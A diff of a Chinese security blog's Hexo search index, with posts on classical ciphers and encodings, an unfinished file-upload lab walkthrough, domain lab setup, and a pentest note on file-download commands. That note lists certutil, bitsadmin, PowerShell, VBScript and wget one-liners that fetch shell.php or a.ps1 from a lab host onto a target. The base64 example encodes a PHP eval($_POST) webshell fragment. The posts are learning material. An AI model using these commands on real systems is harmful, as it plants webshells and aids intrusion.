-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[][([]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+([]+[])[+[[!+[]+!+[]]]]+(![]+[])[+[[+[]]]]+(![]+[])[+[[!+[]+!+[]+!+[]]]]+(![]+[])[+[[+!+ []]]]][([][([]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+([]+[])[+[[!+[]+!+[]]]]+(![]+[])[+[[+[]]]]+(![]+[])[+[[!+[]+!+[]+!+[]]]]+(![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]()</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://www.sojson.com/jsjiemi.html" target="_blank" rel="noopener">JsFuck在线加解密</a></p>
-<h2 id="0x05-栅栏密码"><a href="#0x05-栅栏密码" class="headerlink" title="0x05 栅栏密码"></a>0x05 栅栏密码</h2><p>所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">明文：THERE IS A CIPHER</span><br><span class="line">去掉空格后变为：THEREISACIPHER</span><br><span class="line">两个一组，得到：TH ER EI SA CI PH ER</span><br><span class="line">先取出第一个字母：TEESCPE</span><br><span class="line">再取出第二个字母：HRIAIHR</span><br><span class="line">连在一起就是：TEESCPEHRIAIHR</span><br><span class="line">还原为所需密码。</span><br><span class="line">而解密的时候，我们先把密文从中间分开，变为两行：</span><br><span class="line">T E E S C P E</span><br><span class="line">H R I A I H R</span><br><span class="line">再按上下上下的顺序组合起来：</span><br><span class="line">THEREISACIPHER</span><br><span class="line">分出空格，就可以得到原文了：</span><br><span class="line">THERE IS A CIPHER</span><br><span class="line"> </span><br><span class="line">例如密文：NlEyQd&#123;seft&#125;</span><br><span class="line">N E Q &#123; e t</span><br><span class="line">l y d s f &#125;</span><br><span class="line"></span><br><span class="line">NEQ&#123;etIydsf&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>域环境搭建</title>
     <url>/posts/55656.html</url>
     <content><![CDATA[<h2 id="0x00-环境搭建准备"><a href="#0x00-环境搭建准备" class="headerlink" title="0x00 环境搭建准备"></a>0x00 环境搭建准备</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DC: win server 2008 R2  IP: 192.168.72.10</span><br><span class="line">DM: win xp              IP: 192.168.72.11  </span><br><span class="line">DM: win server 2012     IP: 192.168.72.14</span><br></pre></td></tr></table></figure>
@@ -2676,24 +2639,40 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
-    <title>文件上传(二)之实战篇</title>
-    <url>/posts/31481.html</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近打了场XCTF，看到同学在群里交流，自己不自觉留下来没有技术的泪水。。。<br>好吧，那就开始学吧。。。在网上找到一个不错的上传漏洞汇总的靶场，在本地搭建好环境，开始闭关。。。。。。</p>
-<p>靶场源码地址：<code>github.com/c0ny1/upload-labs</code></p>
-<p>我下载的是靶主已经集成配置好的环境进行本地搭建。</p>
-<p>地址：<code>github.com/c0ny1/upload-labs/releases</code></p>
-<p><img src="/posts/31481/%E4%B8%8A%E4%BC%A01.png" alt="界面"></p>
-<h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><p><img src="/posts/31481/%E4%B8%8A%E4%BC%A02.jpg" alt><br>上传一个<code>2.php</code>文件<br><img src="/posts/31481/%E4%B8%8A%E4%BC%A03.jpg" alt><br>查看提示：<br><img src="/posts/31481/%E4%B8%8A%E4%BC%A03.jpg" alt></p>
-<p>查看源码：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value;</span><br><span class="line">    if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;定义允许上传的文件类型</span><br><span class="line">    var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    &#x2F;&#x2F;提取上传文件的类型</span><br><span class="line">    var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    &#x2F;&#x2F;判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>发现只允许上传<code>.jpg|.png|.gif</code>类型的文件</p>
-<p>未完。。。。。。</p>
+    <title>常见加解密总结</title>
+    <url>/posts/56330.html</url>
+    <content><![CDATA[<h2 id="0x00-base64"><a href="#0x00-base64" class="headerlink" title="0x00  base64"></a>0x00  base64</h2><p>Base64就是用64个可显示字符表示所有的ASCii字符，64也就是6Bits，而ASC字符一共有256个，也就是8Bits。Base64编码要求把3个8位字节（38=24）转化为4个6位的字节（46=24），之后在6位的前面补两个0，形成8位一个字节的形式。 如果剩下的字符不足3个字节，则用0填充，输出字符使用’=’，因此编码后输出的文本末尾可能会出现<strong>1或2个’=’</strong></p>
+<p>形式：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ZXZhbCgkX1BPU1RbcDRuOV96MV96aDNuOV9qMXVfU2gxX0oxM10pNTU2NJC3ODHHYWJIZ3P4ZWY&#x3D;</span><br></pre></td></tr></table></figure>
+<p><a href="http://www1.tc711.com/tool/BASE64.htm" target="_blank" rel="noopener">base64在线加解密</a></p>
+<h2 id="0x01-base32"><a href="#0x01-base32" class="headerlink" title="0x01 base32"></a>0x01 base32</h2><p>Base32是用32个字符表示256个ASCii字符，也就是说5个ASCii字符一组可以生成8个Base字符。</p>
+<h2 id="0x02-培根密码"><a href="#0x02-培根密码" class="headerlink" title="0x02 培根密码"></a>0x02 培根密码</h2><p>培根密码实际上就是一种替换密码，根据所给表一一对应转换即可加密解密 。<br>它的特殊之处在于：可以通过不明显的特征来隐藏密码信息，比如大小写、正斜体等，只要两个不同的属性，密码即可隐藏.需要注意的是输入的都应该是<strong>全小写字母或全大写字母</strong>。</p>
+<p>第一种方式</p>
+<p>A aaaaa B aaaab C aaaba D aaabb<br>E aabaa F aabab G aabba H aabbb<br>I abaaa J abaab K ababa L ababb<br>M abbaa N abbab O abbba P abbbb<br>Q baaaa R baaab S baaba T baabb<br>U babaa V babab W babba X babbb<br>Y bbaaa Z bbaab</p>
+<p>第二种方式</p>
+<p>a AAAAA g AABBA n ABBAA t BAABA<br>b AAAAB h AABBB o ABBAB u-v BAABB<br>c AAABA i-j ABAAA p ABBBA w BABAA<br>d AAABB k ABAAB q ABBBB x BABAB<br>e AABAA l ABABA r BAAAA y BABBA<br>f AABAB m ABABB s BAAAB z BABBB</p>
+<h2 id="0x03-摩斯密码"><a href="#0x03-摩斯密码" class="headerlink" title="0x03 摩斯密码"></a>0x03 摩斯密码</h2><p>摩尔斯电码是一种早期的数字化通信形式，但是它不同于现代只使用零和一两种状态的二进制代码，它的代码包括五种： 点、划、点和划之间的停顿、每个字符间短的停顿（在点和划之间）、每个词之间中等的停顿以及句子之间长的停顿。</p>
+<p>形式：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">– — .-. … .</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.imgur.com/Ar0vSSx.png" alt></p>
+<p><a href="https://www.jb51.net/tools/morse.htm" target="_blank" rel="noopener">摩斯密码在线加解密</a></p>
+<h2 id="0x04-JsFuck"><a href="#0x04-JsFuck" class="headerlink" title="0x04 JsFuck"></a>0x04 JsFuck</h2><p>JSFuck 可以只用6个字符 !+ 来编写 JavaScript 程序。</p>
+<p>形式：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[][([]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+([]+[])[+[[!+[]+!+[]]]]+(![]+[])[+[[+[]]]]+(![]+[])[+[[!+[]+!+[]+!+[]]]]+(![]+[])[+[[+!+ []]]]][([][([]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+([]+[])[+[[!+[]+!+[]]]]+(![]+[])[+[[+[]]]]+(![]+[])[+[[!+[]+!+[]+!+[]]]]+(![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]()</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.sojson.com/jsjiemi.html" target="_blank" rel="noopener">JsFuck在线加解密</a></p>
+<h2 id="0x05-栅栏密码"><a href="#0x05-栅栏密码" class="headerlink" title="0x05 栅栏密码"></a>0x05 栅栏密码</h2><p>所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">明文：THERE IS A CIPHER</span><br><span class="line">去掉空格后变为：THEREISACIPHER</span><br><span class="line">两个一组，得到：TH ER EI SA CI PH ER</span><br><span class="line">先取出第一个字母：TEESCPE</span><br><span class="line">再取出第二个字母：HRIAIHR</span><br><span class="line">连在一起就是：TEESCPEHRIAIHR</span><br><span class="line">还原为所需密码。</span><br><span class="line">而解密的时候，我们先把密文从中间分开，变为两行：</span><br><span class="line">T E E S C P E</span><br><span class="line">H R I A I H R</span><br><span class="line">再按上下上下的顺序组合起来：</span><br><span class="line">THEREISACIPHER</span><br><span class="line">分出空格，就可以得到原文了：</span><br><span class="line">THERE IS A CIPHER</span><br><span class="line"> </span><br><span class="line">例如密文：NlEyQd&#123;seft&#125;</span><br><span class="line">N E Q &#123; e t</span><br><span class="line">l y d s f &#125;</span><br><span class="line"></span><br><span class="line">NEQ&#123;etIydsf&#125;</span><br></pre></td></tr></table></figure>
+
+
+
 ]]></content>
       <categories>
-        <category>Web</category>
+        <category>CTF</category>
       </categories>
       <tags>
-        <tag>文件上传</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -2720,53 +2699,6 @@ string substr(string, start, length)
 </li>
 <li>for …else…<br>只有当循环里没有遇到 break 时，else 块才会执行。<br>当你想在房间里找某样东西时，只要在任意位置找到了，就停止继续搜查工作。但如果把整个房间都翻遍了，还没找到我们想要的东西，需要告诉人家说：这儿没有你要找的东西。<br>遇到这样的情况用 for … else ，除此之外，最好不要用它</li>
 </ol>
-]]></content>
-  </entry>
-  <entry>
-    <title>文件下载</title>
-    <url>/posts/18452.html</url>
-    <content><![CDATA[<h1 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于渗透测试来说，当我们拿到的目标权限过低，会很难进行下一步动作，便需要使用其他利器继续进行提权等操作，当需要将文件下载到目标机器时，就会用到文件下载命令。</p>
-<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="0x00-certutil"><a href="#0x00-certutil" class="headerlink" title="0x00 certutil"></a>0x00 certutil</h3><p>certutil.exe是一个命令行工具，作为Windows server 2003家族证书服务的一部分安装。</p>
-<p><strong>命令详解</strong></p>
-<p>certutil -urlcache -split -f <a href="http://192.168.72.10/shell.php" target="_blank" rel="noopener">http://192.168.72.10/shell.php</a></p>
-<p>将shell.php下载当当前目录</p>
-<p>该命令适用于 server 2003以上版本</p>
-<h3 id="0x01-bitsadmin"><a href="#0x01-bitsadmin" class="headerlink" title="0x01 bitsadmin"></a>0x01 bitsadmin</h3><p>BITSAdmin是一个命令行工具，可用于创建下载或上传作业并监视其进度。</p>
-<p><strong>命令详解</strong></p>
-<p><code>bitsadmin /transfer myDownLoadJob /download /priority normal &quot;http://192.168.72.10/shell.php&quot; &quot;E:\phpstudy_pro\WWW\shell.php&quot;</code></p>
-<p>将shell.php下载到E:\phpstudy_pro\WWW\目录</p>
-<p>该命令适用于win 7以上版本</p>
-<h3 id="0x02-powersehll"><a href="#0x02-powersehll" class="headerlink" title="0x02 powersehll"></a>0x02 powersehll</h3><p><strong>命令详解</strong></p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell(<span class="built_in">new-object</span> Net.WebClient).DownloadFile(<span class="string">'http://192.168.72.10/shell.php'</span>,<span class="string">'E:\phpstudy_pro\WWW\shell.php'</span>)</span><br></pre></td></tr></table></figure>
-
-<p>将shell.php脚本下载到当前目录</p>
-<p>该命令适用于server 2003以上版本</p>
-<h3 id="0x03-vbs"><a href="#0x03-vbs" class="headerlink" title="0x03 vbs"></a>0x03 vbs</h3><ul>
-<li>第一种</li>
-</ul>
-<figure class="highlight vbs"><table><tr><td class="code"><pre><span class="line">echo <span class="keyword">Set</span> Post = <span class="built_in">CreateObject</span>(<span class="string">"Msxml2.XMLHTTP"</span>) &gt;&gt;download.vbs</span><br><span class="line">echo <span class="keyword">Set</span> Shell = <span class="built_in">CreateObject</span>(<span class="string">"Wscript.Shell"</span>) &gt;&gt;download.vbs</span><br><span class="line">echo Post.Open <span class="string">"GET"</span>,<span class="string">"http://192.168.203.140/a.ps1"</span>,<span class="number">0</span> &gt;&gt;download.vbs</span><br><span class="line">echo Post.Send() &gt;&gt;download.vbs</span><br><span class="line">echo <span class="keyword">Set</span> aGet = <span class="built_in">CreateObject</span>(<span class="string">"ADODB.Stream"</span>) &gt;&gt;download.vbs</span><br><span class="line">echo aGet.Mode = <span class="number">3</span> &gt;&gt;download.vbs</span><br><span class="line">echo aGet.Type = <span class="number">1</span> &gt;&gt;download.vbs</span><br><span class="line">echo aGet.Open() &gt;&gt;download.vbs</span><br><span class="line">echo aGet.Write(Post.responseBody) &gt;&gt;download.vbs</span><br><span class="line">echo aGet.SaveToFile <span class="string">"D:/a.ps1"</span>,<span class="number">2</span> &gt;&gt;download.vbs</span><br></pre></td></tr></table></figure>
-
-<p>把下载地址直接echo输入download.vbs。直接下载即可</p>
-<p>该命令适用于server 2003以上版本</p>
-<ul>
-<li>第二种</li>
-</ul>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line"># echo <span class="keyword">set</span> a=<span class="built_in">createobject</span>(^<span class="string">"adod^"</span>+^<span class="string">"b.stream^"</span>):<span class="keyword">set</span> w=<span class="built_in">createobject</span>(^<span class="string">"micro^"</span>+^<span class="string">"soft.xmlhttp^"</span>):w.open^<span class="string">"get^"</span>,wsh.arguments(<span class="number">0</span>),<span class="number">0</span>:w.send:a.type=<span class="number">1</span>:a.open:a.write w.responsebody:a.savetofile wsh.arguments(<span class="number">1</span>),<span class="number">2</span>  &gt;&gt; downfile.vbs</span><br><span class="line"># cscript downfile.vbs http://192.168.203.140/a.ps1 D:\\tomcat8.5\\webapps\\x.ps1</span><br></pre></td></tr></table></figure>
-
-<p>保存脚本后再下载指定文件</p>
-<p>该命令适用于server 2003以上版本</p>
-<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="0x00-curl"><a href="#0x00-curl" class="headerlink" title="0x00 curl"></a>0x00 curl</h3><p><strong>基本用法</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># curl http:&#x2F;&#x2F;www.linux.com</span><br></pre></td></tr></table></figure>
-
-<p>执行后，<a href="http://www.linux.com" target="_blank" rel="noopener">www.linux.com</a> 的html就会显示在屏幕上了</p>
-<p>保存访问的网页</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># curl http:&#x2F;&#x2F;www.linux.com &gt;&gt; linux.html</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># curl -o linux.html http:&#x2F;&#x2F;www.linux.com</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x01-wget"><a href="#0x01-wget" class="headerlink" title="0x01 wget"></a>0x01 wget</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># wget -p &#x2F;etc http:&#x2F;&#x2F;192.168.72.10&#x2F;shell.php</span><br></pre></td></tr></table></figure>
-
-<p>下载文件到 /etc 文件夹下</p>
 ]]></content>
   </entry>
   <entry>
@@ -2829,6 +2761,74 @@ string substr(string, start, length)
       <tags>
         <tag>文件上传</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>文件上传(二)之实战篇</title>
+    <url>/posts/31481.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近打了场XCTF，看到同学在群里交流，自己不自觉留下来没有技术的泪水。。。<br>好吧，那就开始学吧。。。在网上找到一个不错的上传漏洞汇总的靶场，在本地搭建好环境，开始闭关。。。。。。</p>
+<p>靶场源码地址：<code>github.com/c0ny1/upload-labs</code></p>
+<p>我下载的是靶主已经集成配置好的环境进行本地搭建。</p>
+<p>地址：<code>github.com/c0ny1/upload-labs/releases</code></p>
+<p><img src="/posts/31481/%E4%B8%8A%E4%BC%A01.png" alt="界面"></p>
+<h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><p><img src="/posts/31481/%E4%B8%8A%E4%BC%A02.jpg" alt><br>上传一个<code>2.php</code>文件<br><img src="/posts/31481/%E4%B8%8A%E4%BC%A03.jpg" alt><br>查看提示：<br><img src="/posts/31481/%E4%B8%8A%E4%BC%A03.jpg" alt></p>
+<p>查看源码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value;</span><br><span class="line">    if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;定义允许上传的文件类型</span><br><span class="line">    var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    &#x2F;&#x2F;提取上传文件的类型</span><br><span class="line">    var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    &#x2F;&#x2F;判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123;</span><br><span class="line">        var errMsg &#x3D; &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现只允许上传<code>.jpg|.png|.gif</code>类型的文件</p>
+<p>未完。。。。。。</p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件下载</title>
+    <url>/posts/18452.html</url>
+    <content><![CDATA[<h1 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于渗透测试来说，当我们拿到的目标权限过低，会很难进行下一步动作，便需要使用其他利器继续进行提权等操作，当需要将文件下载到目标机器时，就会用到文件下载命令。</p>
+<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="0x00-certutil"><a href="#0x00-certutil" class="headerlink" title="0x00 certutil"></a>0x00 certutil</h3><p>certutil.exe是一个命令行工具，作为Windows server 2003家族证书服务的一部分安装。</p>
+<p><strong>命令详解</strong></p>
+<p>certutil -urlcache -split -f <a href="http://192.168.72.10/shell.php" target="_blank" rel="noopener">http://192.168.72.10/shell.php</a></p>
+<p>将shell.php下载当当前目录</p>
+<p>该命令适用于 server 2003以上版本</p>
+<h3 id="0x01-bitsadmin"><a href="#0x01-bitsadmin" class="headerlink" title="0x01 bitsadmin"></a>0x01 bitsadmin</h3><p>BITSAdmin是一个命令行工具，可用于创建下载或上传作业并监视其进度。</p>
+<p><strong>命令详解</strong></p>
+<p><code>bitsadmin /transfer myDownLoadJob /download /priority normal &quot;http://192.168.72.10/shell.php&quot; &quot;E:\phpstudy_pro\WWW\shell.php&quot;</code></p>
+<p>将shell.php下载到E:\phpstudy_pro\WWW\目录</p>
+<p>该命令适用于win 7以上版本</p>
+<h3 id="0x02-powersehll"><a href="#0x02-powersehll" class="headerlink" title="0x02 powersehll"></a>0x02 powersehll</h3><p><strong>命令详解</strong></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell(<span class="built_in">new-object</span> Net.WebClient).DownloadFile(<span class="string">'http://192.168.72.10/shell.php'</span>,<span class="string">'E:\phpstudy_pro\WWW\shell.php'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>将shell.php脚本下载到当前目录</p>
+<p>该命令适用于server 2003以上版本</p>
+<h3 id="0x03-vbs"><a href="#0x03-vbs" class="headerlink" title="0x03 vbs"></a>0x03 vbs</h3><ul>
+<li>第一种</li>
+</ul>
+<figure class="highlight vbs"><table><tr><td class="code"><pre><span class="line">echo <span class="keyword">Set</span> Post = <span class="built_in">CreateObject</span>(<span class="string">"Msxml2.XMLHTTP"</span>) &gt;&gt;download.vbs</span><br><span class="line">echo <span class="keyword">Set</span> Shell = <span class="built_in">CreateObject</span>(<span class="string">"Wscript.Shell"</span>) &gt;&gt;download.vbs</span><br><span class="line">echo Post.Open <span class="string">"GET"</span>,<span class="string">"http://192.168.203.140/a.ps1"</span>,<span class="number">0</span> &gt;&gt;download.vbs</span><br><span class="line">echo Post.Send() &gt;&gt;download.vbs</span><br><span class="line">echo <span class="keyword">Set</span> aGet = <span class="built_in">CreateObject</span>(<span class="string">"ADODB.Stream"</span>) &gt;&gt;download.vbs</span><br><span class="line">echo aGet.Mode = <span class="number">3</span> &gt;&gt;download.vbs</span><br><span class="line">echo aGet.Type = <span class="number">1</span> &gt;&gt;download.vbs</span><br><span class="line">echo aGet.Open() &gt;&gt;download.vbs</span><br><span class="line">echo aGet.Write(Post.responseBody) &gt;&gt;download.vbs</span><br><span class="line">echo aGet.SaveToFile <span class="string">"D:/a.ps1"</span>,<span class="number">2</span> &gt;&gt;download.vbs</span><br></pre></td></tr></table></figure>
+
+<p>把下载地址直接echo输入download.vbs。直接下载即可</p>
+<p>该命令适用于server 2003以上版本</p>
+<ul>
+<li>第二种</li>
+</ul>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"># echo <span class="keyword">set</span> a=<span class="built_in">createobject</span>(^<span class="string">"adod^"</span>+^<span class="string">"b.stream^"</span>):<span class="keyword">set</span> w=<span class="built_in">createobject</span>(^<span class="string">"micro^"</span>+^<span class="string">"soft.xmlhttp^"</span>):w.open^<span class="string">"get^"</span>,wsh.arguments(<span class="number">0</span>),<span class="number">0</span>:w.send:a.type=<span class="number">1</span>:a.open:a.write w.responsebody:a.savetofile wsh.arguments(<span class="number">1</span>),<span class="number">2</span>  &gt;&gt; downfile.vbs</span><br><span class="line"># cscript downfile.vbs http://192.168.203.140/a.ps1 D:\\tomcat8.5\\webapps\\x.ps1</span><br></pre></td></tr></table></figure>
+
+<p>保存脚本后再下载指定文件</p>
+<p>该命令适用于server 2003以上版本</p>
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="0x00-curl"><a href="#0x00-curl" class="headerlink" title="0x00 curl"></a>0x00 curl</h3><p><strong>基本用法</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># curl http:&#x2F;&#x2F;www.linux.com</span><br></pre></td></tr></table></figure>
+
+<p>执行后，<a href="http://www.linux.com" target="_blank" rel="noopener">www.linux.com</a> 的html就会显示在屏幕上了</p>
+<p>保存访问的网页</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># curl http:&#x2F;&#x2F;www.linux.com &gt;&gt; linux.html</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># curl -o linux.html http:&#x2F;&#x2F;www.linux.com</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x01-wget"><a href="#0x01-wget" class="headerlink" title="0x01 wget"></a>0x01 wget</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># wget -p &#x2F;etc http:&#x2F;&#x2F;192.168.72.10&#x2F;shell.php</span><br></pre></td></tr></table></figure>
+
+<p>下载文件到 /etc 文件夹下</p>
+]]></content>
   </entry>
   <entry>
     <title>文件泄露漏洞</title>
@@ -3273,8 +3273,8 @@ string substr(string, start, length)
         <category>Web</category>
       </categories>
       <tags>
-        <tag>WEB</tag>
         <tag>DVWA</tag>
+        <tag>WEB</tag>
       </tags>
   </entry>
   <entry>
@@ -3605,146 +3605,6 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
-    <title>使用 hexo 搭建个人博客</title>
-    <url>/posts/28047.html</url>
-    <content><![CDATA[<p>一直想搭建一个个人博客，用来记录平时的学习心得。我也用过很多博客，想CSDN、博客园、简书等，但最终还是选择了<code>hexo</code>，这是完全属于我自己的一方净土。</p>
-<h2 id="什么是-hexo-？"><a href="#什么是-hexo-？" class="headerlink" title="什么是 hexo ？"></a>什么是 hexo ？</h2><p><a href="https://hexo.io/" target="_blank" rel="noopener">hexo</a>是个静态博客框架。使用 <a href="https://daringfireball.net/projects/markdown" target="_blank" rel="noopener">Markdown</a> 撰写好文章，Hexo 会转成静态网页部署到 <a href="https://pages.github.com/" target="_blank" rel="noopener">Github Pages</a>。</p>
-<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="安装-Node-js-和-Git"><a href="#安装-Node-js-和-Git" class="headerlink" title="安装 Node.js 和 Git"></a>安装 Node.js 和 Git</h3><p>在安装 Hexo 之前，首先要安装 <a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js</a> 和 <a href="https://git-scm.com/" target="_blank" rel="noopener">Git</a>， Node.js 和 Git 的安装比较简单，请自行查看官方文档，这里不再赘述。</p>
-<p>安装好 Node.js 和 Git 后，用 <a href="https://npmjs.org/" target="_blank" rel="noopener">npm</a> 安装 Hexo ， npm 是 Node.js 的 package manager，会随 Node.js 一同安装。由于墙的关系，建议 npm 换成国内的源，比如<a href="http://npm.taobao.org/" target="_blank" rel="noopener">淘宝 NPM 镜像</a>。推荐安装 <a href="https://github.com/Pana/nrm" target="_blank" rel="noopener">nrm</a> (NPM registry manager)，可以在不同的 registry 之间快速切换：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install -g nrm <span class="comment"># 安装 nrm</span></span><br><span class="line">$ nrm ls <span class="comment"># registry 列表</span></span><br><span class="line">$ nrm use taobao  <span class="comment"># 将 registry 切换为 taobao</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="安装-hexo"><a href="#安装-hexo" class="headerlink" title="安装 hexo"></a>安装 hexo</h3><p>接着使用 npm 安装 hexo：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
-
-<h2 id="创建-Hexo-项目"><a href="#创建-Hexo-项目" class="headerlink" title="创建 Hexo 项目"></a>创建 Hexo 项目</h2><p>安装好 Hexo 后，在本地新建个文件夹作为 Hexo 项目文件夹，名称随意，我的叫 <code>lihthub.github.io</code> ，执行下列命令，Hexo 会在指定文件夹 <code>lihthub.github.io</code> 中新建所需要的文件：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo init lihthub.github.io <span class="comment"># 初始化 Hexo 项目</span></span><br><span class="line">$ <span class="built_in">cd</span> lihthub.github.io</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure>
-
-<p>初始化后，会在文件夹 <code>lihthub.github.io</code> 里生成以下目录结构，这就是你的 Workspace：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml <span class="comment"># 配置文件</span></span><br><span class="line">├── package.json <span class="comment"># 项目所需模块项目的配置信息</span></span><br><span class="line">├── scaffolds <span class="comment"># 用命令生成文章等的模板</span></span><br><span class="line">├── <span class="built_in">source</span> <span class="comment"># 源文件夹，这里放置网站内容</span></span><br><span class="line">|   ├── _drafts <span class="comment"># 放置草稿 markdown 文件</span></span><br><span class="line">|   └── _posts <span class="comment"># 放置博文 markdown 文件</span></span><br><span class="line">└── themes <span class="comment"># 主题文件夹，Hexo 通过将网站内容与主题相结合来生成一个静态网站</span></span><br></pre></td></tr></table></figure>
-
-<p>在 <code>_config.yml</code> 配置文件中填写你的网站的 <code>title</code>、<code>description</code>、<code>author</code> 。更多配置请参考 <a href="https://hexo.io/docs/configuration.html" target="_blank" rel="noopener">Hexo Configuration</a>。</p>
-<p>接着执行下列命令：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo generate # 生成静态文件</span><br><span class="line">$ hexo server # 启动本地服务</span><br></pre></td></tr></table></figure>
-
